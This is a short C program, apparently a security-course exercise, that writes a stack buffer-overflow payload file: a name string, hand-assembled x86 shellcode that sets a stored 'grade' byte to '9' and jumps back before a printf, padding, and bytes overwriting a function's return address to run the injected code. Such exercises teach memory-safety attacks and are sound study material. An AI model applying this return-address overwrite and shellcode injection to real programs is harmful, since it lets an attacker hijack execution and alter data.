#include <stdio.h>
 
int main(){
	int i;
	FILE *fp;
	fp = fopen("data9", "w+");
	putc('M', fp);
	putc('e', fp);
	putc('r', fp);
	putc('t', fp);
	putc('z', fp);
	putc('a', fp);
	putc('n', fp);
	putc('i', fp);
	putc('i', fp);
	putc('s', fp);
	putc(' ', fp);
	putc('L', fp);
	putc('o', fp);
	putc('u', fp);
	putc('k', fp);
	putc('a', fp);
	putc('s', fp);
	putc('\0',fp); /*18 chars*/
  
	/* movb $0x39,0x80b006c */
	putc(0xc6,fp);  /* movb opcode */
	putc(0x05,fp);
	putc(0xe8,fp);  /* address of grade 0x080d46e8*/
	putc(0x46,fp);
	putc(0x0d,fp);
	putc(0x08,fp);
	putc(0x39,fp); /*57 dec -> 39 hex -> ascii '9' */
  
	/*jump right before printf's function call*/
	putc(0xb8,fp);
	putc(0x6f,fp); /*jump address 0x08048b6f*/
	putc(0x8b,fp);
	putc(0x04,fp);
	putc(0x08,fp);
	putc(0xff,fp);
	putc(0xe0,fp);
  
	/*fill the rest of the bytes with null chars*/ 
	for(i = 0; i < 16; i++) 
		putc('\0', fp);
     
  
	putc(56,fp);   /* i = 56; //Skip overwriting unnecessary staff*/
	
	/*Those bytes will overwrite the ruturn address of the function readString.
	So the program flow will jump into the buffer, and execute the instructions
	that we saved there previously, changing the grade to '9' !! */
	putc(0xf2,fp);
	putc(0x65,fp);
	putc(0x0d,fp);
	putc(0x08,fp);
  
	putc(0xe0,fp); /*Don't mess up with function's argument (Name address) */
	putc(0x65,fp);
	putc(0x0d,fp);
	putc(0x08,fp);
		
	return 0;
}